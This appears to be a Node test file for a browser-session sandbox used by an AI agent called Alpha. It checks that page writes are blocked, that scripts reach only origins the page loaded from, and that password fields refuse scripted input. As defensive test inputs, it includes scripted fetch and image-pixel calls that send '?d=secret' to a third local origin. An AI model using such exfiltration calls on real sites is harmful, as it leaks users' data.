// The read session's walls, against real pages on three local origins: A is the page, B serves
// one of its images (so B is "used while loading"), C is somewhere else. Run with
// `node --test scripts/`; needs a Chromium-family browser (ALPHA_TEST_BROWSER, else Chrome or
// Edge in /Applications), and is skipped without one.
import { spawn } from "node:child_process";
import { existsSync } from "node:fs";
import { createServer } from "node:http";
import { test } from "node:test";
import assert from "node:assert/strict";

const BROWSER = [process.env.ALPHA_TEST_BROWSER, "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
  "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge"].find((p) => p && existsSync(p));
const DRIVER = new URL("./browser_session.mjs", import.meta.url).pathname;

function server(page) {
  const seen = [];
  const s = createServer((req, res) => {
    seen.push(`${req.method} ${req.url.split("?")[0]}`);
    res.setHeader("access-control-allow-origin", "*");
    if (req.url === "/") res.setHeader("content-type", "text/html");
    res.end(req.url === "/" ? page() : "ok");
  });
  return new Promise((resolve) => s.listen(0, "127.0.0.1", () => resolve({ s, seen, origin: `http://127.0.0.1:${s.address().port}` })));
}

function run(job) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [DRIVER], { cwd: new URL("..", import.meta.url).pathname });
    let out = "";
    child.stdout.on("data", (d) => (out += d));
    child.on("close", () => resolve(JSON.parse(out.trim().split("\n").pop())));
    child.stdin.end(JSON.stringify({ browser: BROWSER, ...job }) + "\n");
  });
}

const sites = async () => {
  const b = await server(() => "");
  const c = await server(() => "");
  const a = await server(() => `<html><body><img src="${b.origin}/logo.png">
    <input type="password" id="pw"><input type="text" id="q">
    <script>
      fetch("/write", { method: "POST", body: "x" }).catch(() => {});
      navigator.sendBeacon("/beacon", "x");
      setTimeout(() => fetch("/more", { method: "POST", body: "page=2" }).catch(() => {}), 200);
    </script><a href="/next">next</a></body></html>`);
  return { a, b, c, close: () => [a, b, c].forEach((x) => x.s.close()) };
};

test("writes are blocked from the first request, but a reader's allowed POST", { skip: !BROWSER }, async () => {
  const { a, close } = await sites();
  try {
    const out = await run({ op: "read", url: `${a.origin}/`, allow_posts: [{ origin: a.origin, path: "/mo*" }] });
    assert.equal(out.error, undefined);
    assert.ok(!a.seen.includes("POST /write") && !a.seen.includes("POST /beacon"), a.seen.join(", "));
    assert.ok(a.seen.includes("POST /more"));
    assert.ok(out.writes_blocked >= 2);
    assert.deepEqual(out.posts_allowed.map((p) => new URL(p.url).pathname), ["/more"]);
  } finally {
    close();
  }
});

test("Alpha's script reaches only the origins the page used while loading", { skip: !BROWSER }, async () => {
  const { a, b, c, close } = await sites();
  try {
    const script = `
      const go = (u) => fetch(u).then(() => "ok", () => "blocked");
      const results = [await go("${c.origin}/leak?d=secret"), await go("${b.origin}/fine"), await go("/self")];
      new Image().src = "${c.origin}/pixel?d=secret";
      await new Promise((r) => setTimeout(r, 300));
      return results;`;
    const out = await run({ op: "script", url: `${a.origin}/`, script });
    assert.deepEqual(out.result, ["blocked", "ok", "ok"]);
    assert.deepEqual(c.seen, []);
    assert.ok(b.seen.includes("GET /fine"));
    assert.ok(out.egress_blocked >= 2);
  } finally {
    close();
  }
});

test("password fields refuse what a script types", { skip: !BROWSER }, async () => {
  const { a, close } = await sites();
  try {
    const typed = await run({ op: "script", url: `${a.origin}/`, script: `document.getElementById("q").value = "hello"; return document.getElementById("q").value;` });
    assert.equal(typed.result, "hello");
    const refused = await run({ op: "script", url: `${a.origin}/`, script: `document.getElementById("pw").value = "hunter2"; return "typed";` });
    assert.match(refused.error, /never types into password or card fields/);
  } finally {
    close();
  }
});
